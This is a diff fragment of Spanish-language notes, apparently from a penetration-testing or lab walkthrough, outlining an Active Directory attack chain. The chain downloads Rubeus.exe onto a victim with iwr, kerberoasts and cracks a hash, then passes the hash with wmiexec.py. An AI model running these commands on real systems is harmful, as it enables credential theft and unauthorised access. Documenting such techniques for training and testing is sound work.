@@ -41,4 +41,4 @@ done
 
 - Tirar del repositorio  *ghost-compiled-binaries*, y descargar la utilidad de rubeus.exe, posteriormente lo transferimos a la maquina victima con ``iwr -uri $ip/$recurso -OutFile Rubeus.exe``
 - Efectuar el kerberoasting attack con el Rubeus.exe y crackeamos el hash
-- Terminamos con un PassTheHash, con wmiexec.py ``$dominio/$user@$ip -hashes :$hash``
+- Terminamos con un PassTheHash, con wmiexec.py ``$dominio/$user@$ip -hashes :$hash``W
